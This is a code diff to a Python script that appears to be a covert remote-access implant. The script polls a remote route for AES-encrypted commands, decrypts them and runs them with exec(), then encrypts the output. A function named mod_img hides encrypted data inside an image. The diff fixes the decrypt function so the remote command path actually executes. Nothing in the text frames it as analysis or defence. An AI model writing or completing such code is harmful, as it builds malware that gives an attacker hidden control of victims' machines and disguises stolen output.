@@ -25,13 +25,14 @@ def encrypt(plain_str):
 
 #Decryption of data 
 def decrypt(ciphertext): 
+    ciphertext = ciphertext.encode("latin-1")
     init_v = ciphertext[-16:]
     cipher = AES.new(global_key, AES.MODE_CBC, init_v)
     msg = ciphertext[:-16]
     plaintext = cipher.decrypt(msg)
     plaintext = plaintext[:-plaintext[len(plaintext)-1]]
     print(f"[*] Unencrypted Message: {plaintext.decode()}")
-    return msg 
+    return plaintext.decode() 
 
 #str is the encrypted string of data that needs to be hidden in a file. 
 def mod_img(msg):
@@ -112,8 +113,8 @@ if __name__ == '__main__':
             response = requests.get(routes[0]) 
             encrypted_cmd = parse_json(response) 
             cipher_text = encrypt("Testing testing 123~")
-            cmd = decrypt(cipher_text) 
-            cmd = encrypted_cmd
+            cmd = decrypt(encrypted_cmd) 
+            # cmd = encrypted_cmd
             output = exec(cmd) 
             if output != "": 
                 msg = encrypt(output)
